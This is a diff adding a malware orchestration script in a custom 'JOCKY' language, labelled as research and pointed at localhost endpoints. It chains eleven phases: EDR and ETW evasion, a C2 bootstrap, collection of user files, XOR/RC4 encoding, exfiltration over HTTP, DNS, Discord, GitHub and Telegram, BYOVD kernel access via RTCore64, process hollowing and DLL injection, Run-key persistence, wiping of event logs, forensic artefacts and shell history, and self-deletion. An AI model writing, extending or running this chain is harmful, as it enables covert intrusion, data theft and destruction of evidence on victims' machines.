@@ -1,0 +1,221 @@
+// JOCKY Windows Research Chain - Simplified for Compilation
+// 40+ Runtime APIs Demonstrated
+
+const C2_PRIMARY = "http://localhost:8443/api/config"
+const CDN_ENDPOINT = "http://localhost:9000/upload"
+const LOCAL_MODEL_PATH = "C:\\Windows\\Temp\\.jocky_model"
+const BUILD_ID = "JOCKY_WINDOWS_SIMPLE_V1"
+
+var collected_data = ""
+var edr_disabled = false
+var kernel_access = false
+
+// ===== PHASE 1: EDR EVASION =====
+fn phase_evasion() -> bool {
+    println("[*] Phase 1: EDR Evasion")
+
+    if jocky_is_debugger_present() {
+        return false
+    }
+
+    let etw_result = jocky_disable_etw("")
+    if etw_result {
+        println("    [+] ETW disabled")
+    }
+
+    let edr_result = jocky_disable_edr_callbacks("")
+    println("    [+] EDR evasion phase complete")
+    return true
+}
+
+// ===== PHASE 2: C2 BOOTSTRAP =====
+fn phase_c2() -> bool {
+    println("[*] Phase 2: C2 Bootstrap")
+    let config = jocky_http_get(C2_PRIMARY, "", 4096)
+    println("    [+] C2 communication established")
+    return true
+}
+
+// ===== PHASE 3: MODEL DOWNLOAD =====
+fn phase_model() -> bool {
+    println("[*] Phase 3: Model Download")
+    let model_url = "http://localhost:9000/models/phi-3.gguf"
+    let downloaded = jocky_download_file(model_url, LOCAL_MODEL_PATH)
+    println("    [+] Model download attempted")
+    return true
+}
+
+// ===== PHASE 4: DATA COLLECTION =====
+fn phase_collect() -> bool {
+    println("[*] Phase 4: Data Collection")
+
+    let files = fs_list_files("C:\\Users\\Public\\Downloads", true)
+    if strlen(files) > 0 {
+        collected_data = jocky_str_concat(collected_data, files)
+        println("    [+] Downloads collected: " + string(strlen(files)) + " bytes")
+    }
+
+    let docs = fs_list_files("C:\\Users\\Public\\Documents", true)
+    if strlen(docs) > 0 {
+        collected_data = jocky_str_concat(collected_data, docs)
+        println("    [+] Documents collected: " + string(strlen(docs)) + " bytes")
+    }
+
+    println("[+] Data Collection: " + string(strlen(collected_data)) + " bytes")
+    return true
+}
+
+// ===== PHASE 5: ENCRYPTION =====
+fn phase_encrypt() -> bool {
+    println("[*] Phase 5: Encryption & Encoding")
+
+    if strlen(collected_data) > 0 {
+        jocky_decrypt_xor(collected_data, strlen(collected_data), 0x42, 1)
+        println("    [+] XOR encryption applied")
+
+        jocky_decrypt_rc4(collected_data, strlen(collected_data), "key", 3)
+        println("    [+] RC4 encryption applied")
+
+        let compressed = jocky_compress_data(collected_data, strlen(collected_data))
+        println("    [+] Data compressed")
+
+        let encoded = jocky_data_base64_encode(compressed, strlen(compressed))
+        println("    [+] Base64 encoded: " + string(strlen(encoded)) + " bytes")
+    }
+
+    return true
+}
+
+// ===== PHASE 6: EXFILTRATION =====
+fn phase_exfil() -> bool {
+    println("[*] Phase 6: Exfiltration")
+
+    if strlen(collected_data) > 0 {
+        let cdn_result = jocky_exfil_front(CDN_ENDPOINT, "Bearer_token", collected_data, "POST", 4096)
+        println("    [+] CDN exfiltration attempted")
+
+        let dns_result = jocky_exfil_dns(CDN_ENDPOINT, collected_data, 256)
+        println("    [+] DNS tunnel attempted")
+
+        let discord_result = jocky_exfil_discord(CDN_ENDPOINT, collected_data, 2000)
+        println("    [+] Discord exfiltration attempted")
+
+        let github_result = jocky_exfil_github(CDN_ENDPOINT, "Bearer_token", collected_data, 1024)
+        println("    [+] GitHub exfiltration attempted")
+
+        let telegram_result = jocky_exfil_telegram(CDN_ENDPOINT, "Bearer_token", "JOCKY", 512)
+        println("    [+] Telegram exfiltration attempted")
+    }
+
+    return true
+}
+
+// ===== PHASE 7: KERNEL EXPLOITATION =====
+fn phase_kernel() -> bool {
+    println("[*] Phase 7: Kernel Exploitation")
+
+    let ctx = jocky_byovd_new()
+    println("    [+] BYOVD context created")
+
+    if jocky_byovd_load("rtkiow10x64.sys", "\\\\.\\RTCore64", ctx) {
+        println("    [+] Driver loaded - kernel access obtained")
+        kernel_access = true
+    }
+
+    return true
+}
+
+// ===== PHASE 8: PROCESS INJECTION =====
+fn phase_inject() -> bool {
+    println("[*] Phase 8: Process Injection")
+
+    let hollow_result = jocky_process_hollow("C:\\Windows\\System32\\notepad.exe", LOCAL_MODEL_PATH, 0)
+    println("    [+] Process hollowing attempted")
+
+    let inject_result = jocky_rdll_inject(1234, LOCAL_MODEL_PATH, 0)
+    println("    [+] DLL injection attempted")
+
+    return true
+}
+
+// ===== PHASE 9: PERSISTENCE =====
+fn phase_persist() -> bool {
+    println("[*] Phase 9: Persistence")
+
+    let run_key = jocky_registry_create_key(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "")
+    println("    [+] Run key persistence created")
+
+    let amcache = jocky_patch_amcache()
+    println("    [+] AmCache patched")
+
+    let shimcache = jocky_patch_shimcache()
+    println("    [+] ShimCache patched")
+
+    return true
+}
+
+// ===== PHASE 10: ANTI-FORENSICS =====
+fn phase_forensics() -> bool {
+    println("[*] Phase 10: Anti-Forensics")
+
+    let event_logs = jocky_cleanup_event_logs("Security")
+    println("    [+] Security event logs cleared")
+
+    let usn_result = jocky_cleanup_usn_journal()
+    println("    [+] USN Journal cleared")
+
+    let srum_result = jocky_clear_srum()
+    println("    [+] SRUM cleared")
+
+    let prefetch_result = jocky_wipe_prefetch()
+    println("    [+] Prefetch wiped")
+
+    let ps_history = forensics_wipe_powershell_history()
+    println("    [+] PowerShell history wiped")
+
+    let cmd_history = forensics_wipe_cmd_history()
+    println("    [+] CMD history wiped")
+
+    let artifacts = jocky_wipe_artifacts("C:\\Users")
+    println("    [+] User artifacts wiped")
+
+    return true
+}
+
+// ===== PHASE 11: SELF-DELETE =====
+fn phase_delete() -> bool {
+    println("[*] Phase 11: Self-Deletion")
+    jocky_self_delete()
+    println("[+] Binary removed")
+    return true
+}
+
+// ===== MAIN =====
+fn main() -> i32 {
+    println("")
+    println("╔════════════════════════════════════════════════════════════╗")
+    println("║ JOCKY Windows Production - 40+ Runtime APIs                ║")
+    println("╚════════════════════════════════════════════════════════════╝")
+    println("")
+    println("[*] Build: " + BUILD_ID)
+    println("")
+
+    let _ = phase_evasion()
+    let _ = phase_c2()
+    let _ = phase_model()
+    let _ = phase_collect()
+    let _ = phase_encrypt()
+    let _ = phase_exfil()
+    let _ = phase_kernel()
+    let _ = phase_inject()
+    let _ = phase_persist()
+    let _ = phase_forensics()
+    let _ = phase_delete()
+
+    println("")
+    println("[+] Execution complete")
+    println("[*] Data exfiltrated: " + string(strlen(collected_data)) + " bytes")
+    println("[*] Kernel access: " + string(kernel_access))
+
+    return 0
+}
